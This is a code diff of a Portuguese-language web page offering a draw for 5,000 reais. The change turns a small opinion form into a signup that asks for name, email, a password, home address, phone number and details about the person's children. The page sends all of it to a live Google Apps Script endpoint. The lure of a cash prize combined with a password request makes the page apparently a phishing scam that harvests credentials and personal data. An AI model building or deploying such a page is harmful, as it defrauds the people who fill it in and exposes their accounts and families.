@@ -2,50 +2,179 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Participar do Sorteio</title>
+  <title>Formulário de  Sorteio De 5 Mil Reais
+  Cadastre-se para participar </title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+      background-color: #f5f5f5;
+    }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 600px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    textarea,
+    select {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    textarea {
+      resize: vertical;
+    }
+    .btn {
+      background-color: #28a745;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .btn:hover {
+      background-color: #218838;
+    }
+  </style>
 </head>
 <body>
-  <h1>Participe do Sorteio!</h1>
-  <form id="formulario">
-    <label>Nome:</label><br>
-    <input type="text" id="nome" required><br><br>
-
-    <label>Email:</label><br>
-    <input type="email" id="email" required><br><br>
-
-    <label>Opinião:</label><br>
-    <textarea id="opiniao" required></textarea><br><br>
-
-    <button type="submit">Enviar</button>
-  </form>
+  <div class="container">
+    <h1> Sorteio De 5 Mil Reais,
+	Cadastre-se para participar </h1>
+	 <h1> (Todos serão realizados e a melhor resposta leva-para o premio) </h1>
+    <form id="cadastroForm">
+      <div class="form-group">
+        <label for="nome">Nome:</label>
+        <input type="text" id="nome" name="nome" required>
+      </div>
+      <div class="form-group">
+        <label for="sobrenome">Sobrenome:</label>
+        <input type="text" id="sobrenome" name="sobrenome" required>
+      </div>
+      <div class="form-group">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required>
+      </div>
+      <div class="form-group">
+        <label for="senha">Senha:</label>
+        <input type="password" id="senha" name="senha" required>
+      </div>
+      <div class="form-group">
+        <label for="endereco">Endereço:</label>
+        <input type="text" id="endereco" name="endereco" required>
+      </div>
+      <div class="form-group">
+        <label for="telefone">Telefone para contato:</label>
+        <input type="text" id="telefone" name="telefone" required>
+      </div>
+      <div class="form-group">
+        <label for="sonho">Qual seu sonho:</label>
+        <textarea id="sonho" name="sonho" rows="3" required></textarea>
+      </div>
+      <div class="form-group">
+        <label for="premio">O que fará como prêmio:</label>
+        <textarea id="premio" name="premio" rows="3" required></textarea>
+      </div>
+      <div class="form-group">
+        <label>Você é uma pessoa responsável?</label>
+        <select id="responsavel" name="responsavel" required>
+          <option value="">Selecione</option>
+          <option value="Sim">Sim</option>
+          <option value="Não">Não</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>Tem filhos?</label>
+        <select id="temFilhos" name="temFilhos" required>
+          <option value="">Selecione</option>
+          <option value="Não">Não</option>
+          <option value="Sim">Sim</option>
+        </select>
+      </div>
+      <div class="form-group" id="quantosFilhosGroup" style="display: none;">
+        <label for="quantosFilhos">Se sim, quantos?</label>
+        <input type="number" id="quantosFilhos" name="quantosFilhos" min="1">
+      </div>
+      <div class="form-group" id="faixaIdadeGroup" style="display: none;">
+        <label for="faixaIdade">Qual a faixa de idade dos filhos?</label>
+        <input type="text" id="faixaIdade" name="faixaIdade" placeholder="Ex: 0-5, 6-10, etc.">
+      </div>
+      <button type="submit" class="btn">Enviar Cadastro</button>
+    </form>
+  </div>
 
   <script>
-    const form = document.getElementById('formulario');
+    // Mostrar/esconder campos de filhos
+    const temFilhos = document.getElementById('temFilhos');
+    const quantosFilhosGroup = document.getElementById('quantosFilhosGroup');
+    const faixaIdadeGroup = document.getElementById('faixaIdadeGroup');
 
+    temFilhos.addEventListener('change', function() {
+      if (this.value === 'Sim') {
+        quantosFilhosGroup.style.display = 'block';
+        faixaIdadeGroup.style.display = 'block';
+      } else {
+        quantosFilhosGroup.style.display = 'none';
+        faixaIdadeGroup.style.display = 'none';
+      }
+    });
+
+    const form = document.getElementById('cadastroForm');
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
       const dados = {
         nome: document.getElementById('nome').value,
+        sobrenome: document.getElementById('sobrenome').value,
         email: document.getElementById('email').value,
-        opiniao: document.getElementById('opiniao').value
+        senha: document.getElementById('senha').value,
+        endereco: document.getElementById('endereco').value,
+        telefone: document.getElementById('telefone').value,
+        sonho: document.getElementById('sonho').value,
+        premio: document.getElementById('premio').value,
+        responsavel: document.getElementById('responsavel').value,
+        temFilhos: document.getElementById('temFilhos').value,
+        quantosFilhos: document.getElementById('quantosFilhos').value,
+        faixaIdade: document.getElementById('faixaIdade').value
       };
 
-      fetch("COLE_AQUI_SEU_LINK_WEBAPP", {
+      fetch("https://script.google.com/macros/s/AKfycbwDoBv1QG9gXga8_-Jzlzsf3vcanI_suTMutVqE5vbPZ-7VWNakNPGNIWcrOOsq2V1Tqg/exec", {
         method: "POST",
-        body: JSON.stringify(dados)
+        body: JSON.stringify(dados),
+        headers: {
+          "Content-Type": "application/json"
+        }
       })
       .then(response => {
         if (response.ok) {
-          alert("Dados enviados com sucesso!");
+          alert("Cadastro enviado com sucesso!");
           form.reset();
+          quantosFilhosGroup.style.display = 'none';
+          faixaIdadeGroup.style.display = 'none';
         } else {
-          alert("Erro ao enviar os dados.");
+          alert("Erro ao enviar cadastro.");
         }
       })
-      .catch((error) => {
+      .catch(error => {
         console.error("Erro:", error);
-        alert("Ocorreu um erro.");
+        alert("Ocorreu um erro ao enviar.");
       });
     });
   </script>
